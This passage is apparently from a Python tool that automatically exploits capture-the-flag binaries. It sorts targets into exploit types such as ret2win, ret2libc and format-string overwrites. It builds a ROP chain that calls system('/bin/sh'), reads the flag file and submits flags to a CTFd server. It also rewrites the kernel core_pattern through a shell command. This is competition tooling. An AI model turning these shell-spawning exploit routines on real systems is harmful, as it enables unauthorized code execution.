                        chain = bytes(self.__buffer) + p64(pop_rdi) + p64(bin_sh) + p64(self.__get_ret()) + p64(base + self.__libc.sym["system"])
                        p.sendline(chain)
                        p.sendline(b"cat flag.txt")
                        p.sendline(b"exit")
                        temp_flag = p.recvall(timeout=3).decode("ascii")
                    except Exception as e:
                        temp_flag = ""
                        p.close()
                if len(re.findall(flag_pattern, temp_flag)) > 0: break
            
        self.rz.quit()
        flags = re.findall(flag_pattern, temp_flag)
        if len(flags) > 0:
            self.flag = flags[0]
            
        if self.flag != "":
            print(f"Found flag {self.file}: {self.flag}")
            self.__send_flag()
        else:
            print(Style.BRIGHT + Back.RED + f"Exploiting {self.file}: No Exploit Landed. There Goes Our Streak." + Style.RESET_ALL)
        
    def analyze(self) -> None:
        
        # Overflow and printf leak detection.
        self.__init_angr()
        if self.__buffer == None and not self.__has_leak:
            # Backup overflow detection.
            self.__corefile_backup()
        
        if self.__buffer is None and not self.__has_leak:
            print(Fore.MAGENTA + Style.BRIGHT + Back.CYAN + f"Analyzing {self.file}: Overflow Not Successfull!" + Style.RESET_ALL)
        elif not self.__has_leak:
            print(Fore.MAGENTA + f"{self.file} {self.__buffer}" + Style.RESET_ALL)
                            
        # Analyze possible attacks and mark the recipe.
        
        if self.__has_leak:
            if "win" in self.__bin.sym.keys() and "pwnme" in self.__bin.sym.keys():
                self.recipe["FormStrWritePrim"] = True
            elif "win" in self.__bin.sym.keys():
                self.recipe["FormStrGOTOver"] = True
            else:
                self.recipe["FormStrStackLeak"] = True
        elif self.__has_overflow:
            if "win" in self.__bin.sym.keys():
                self.recipe["ret2win"] = True
            elif "execve" in self.__bin.sym.keys():
                self.recipe["ret2execve"] = True
            elif self.__get_instruct("syscall") != b"":
                self.recipe["ret2syscall"] = True
            elif "system" in self.__bin.sym.keys() and len(self.__found_imp_strings()) > 0:
                self.recipe["ret2system"] = True
            elif "system" in self.__bin.sym.keys():
                self.recipe["ROPWritePrim"] = True
            else:
                self.recipe["ret2libc"] = True
        else:
            self.recipe["ArrayIndexAbuse"] = True

def logo():
    print(Back.CYAN + Fore.WHITE + '                                  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                            XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                        .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                     .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '               XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.     .XXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '             .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX      .XXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '            XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.      XXXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '          .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX      .XXXXXXXXXXXXXXXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '         .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.      XXXXXXXXXXXXXXXXXXXXXXXXXXXXX         ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '         XXXX                        .XX.                   .XXX.                         ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '        XXXX                         XXX                    XXX                           ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '       .XXX                         .XXX                   .XX.                           ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '       XXXX       XXXXXXXXXXXXXXXXXXXXXXXXXX      .XXXXXXXXXXX      .XXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '      .XXX       XXXXXXXXXXXXXXXXXXXXXXXXXX.      XXXXXXXXXXX.      XXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '      XXXX      .XXXXXXXXXXXXXXXXXXXXXXXXXX      .XXXXXXXXXXX       XXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '      XXX                       .XXXXXXXXX.      XXXXXXXXXXXX      XXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '      XXXX                         XXXXXXX      .XXXXXXXXXXX.      XXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '      XXXXX                        .XXXXXX      XXXXXXXXXXXX      .XXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '      XXXXXXXXXXXXXXXXXXXXXX       XXXXXX       XXXXXXXXXXX.      XXXXXXXXXXXXXXX.        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '      XXXXXXXXXXXXXXXXXXXXXX       XXXXXX      .XXXXXXXXXXX      .XXXXXXXXXXXXXXX         ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '      .XXXXXXXXXXXXXXXXXXXXX      .XXXXX.      XXXXXXXXXXX.      XXXXXXXXXXXXXXXX         ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '       XXXXXXXXXXXXXXXXXXXX.      XXXXXX      .XXXXXXXXXXX      .XXXXXXXXXXXXXXX.         ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                                 .XXXXX.              .XXX      XXXXXXXXXXXXXXXX          ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                                 XXXXXXX              .XX.      XXXXXXXXXXXXXXX           ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                               .XXXXXXXXX             XXX      .XXXXXXXXXXXXXX.           ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '          .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.            ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '           XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.             ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '            XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX               ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '             .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.                ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '               .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX                  ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.                   ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                   .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX                      ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                     .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.                        ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                         .XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.                           ' + Style.RESET_ALL)
    print(Back.CYAN + Fore.WHITE + '                             .XXXXXXXXXXXXXXXXXXXXXXXXXXXXX                               ' + Style.RESET_ALL)
    print('')
    print(Back.RED + Fore.WHITE + '                          This pwnage brought to you by STR Inc.                          ' + Style.RESET_ALL)
    print(Back.RED + Fore.WHITE + '                       Gr33tz to D4n, C4rl, Loui3, R0bb13, Chr1z                          ' + Style.RESET_ALL)
         
            
def execute(filename:str, chal_id:int):
    run = SHART(filename, chal_id)
    run.analyze()
    run.exploit()
    

if __name__ == "__main__":
    
    print("S.H.A.R.T Initializing . . .")
        
    start_time = time.time()

    # ----- Download Binary Repo ----- #
    while(1):
        try:
            subprocess.run("git clone https://github.com/tj-oconnor/ace-binaries.git", shell=True)
            os.chdir("ace-binaries/test-binaries") # CHANGE THIS EVENTUALLY
            break
        except Exception as e:
            print("Failed to clone git repo!")
    # -------------------------------- #

    if not os.path.isfile("./flag.txt"):
        with open("flag.txt", "w") as f:
            f.write("flag\{pwned\}\n")

    # ----- Get the first chal id ---- #
    challenge_url = f"{ctfd_url}/api/v1/challenges"
    response = requests.get(challenge_url, headers=headers)
    json_data = json.loads(response.text).get("data", {})
    challenge_list = {i["name"]: int(i["id"]) for i in json_data}
    # -------------------------------- #

    # ----- Main Execution Loop! ----- # 
    subprocess.run(["echo '/cores/core.%p' | tee /proc/sys/kernel/core_pattern"], capture_output=True, shell=True) 
    jobs = []
    filenames = os.listdir()
    for file in filenames:
        if ".txt" not in file and ".py" not in file and ".gdb" not in file:
            if "_patched" not in file:
                subprocess.run(f"pwninit --bin {file} --libc /opt/libc.so.6 --ld /opt/ld-2.27.so --no-template && mv {file}_patched {file}", shell=True, stdout=PIPE, stderr=PIPE)
            corrected = file.replace("_", "-")
            jobs.append(Process(target=execute, args=(file, challenge_list[corrected])))
            
    
    control = []
    for job in jobs:
        job.start()
        control.append(job)
        if len(control) == 16:
            while len(control) > 10:
                for sub in control:
                    if not sub.is_alive():
                        control.remove(sub)
                        sub.close()
    while len(control) > 0:
        for sub in control:
            if not sub.is_alive():
                control.remove(sub)
                sub.close()
    logo()
    end_time = time.time()
    print(f"S.H.A.R.T END: {end_time - start_time:.4f}")    
